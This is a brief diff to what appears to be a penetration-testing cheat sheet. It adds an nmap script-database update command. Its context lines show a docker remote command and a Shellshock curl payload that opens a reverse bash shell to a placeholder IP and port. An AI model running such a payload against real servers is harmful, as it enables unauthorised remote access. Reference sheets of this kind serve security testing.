@@ -312,3 +312,8 @@ docker -H <IP>:<HOST> images
 ```
 curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" <URL>/x.sh
 ```
+
+### [Updating NMAP Script Engine]
+```
+nmap --script-updatedb
+```
